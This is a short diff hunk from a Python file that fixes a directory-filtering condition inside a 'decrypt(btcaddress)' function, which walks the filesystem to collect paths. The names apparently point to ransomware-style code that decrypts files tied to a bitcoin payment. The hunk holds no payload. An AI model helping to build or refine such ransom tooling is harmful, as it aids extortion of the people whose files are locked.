@@ -99,7 +99,7 @@ def decrypt(btcaddress):
         for root, dirs, files in os.walk(defaultdir):
             for dir in dirs:
                 fullpath = os.path.join(root, dir)
-                if not any(ignored in fullpath or not fullpath.startswith(ignored) for ignored in ignoredirs):
+                if not any(ignored in fullpath or fullpath.startswith(ignored) for ignored in ignoredirs):
                     validpaths.append(fullpath)
 
         for path in validpaths:
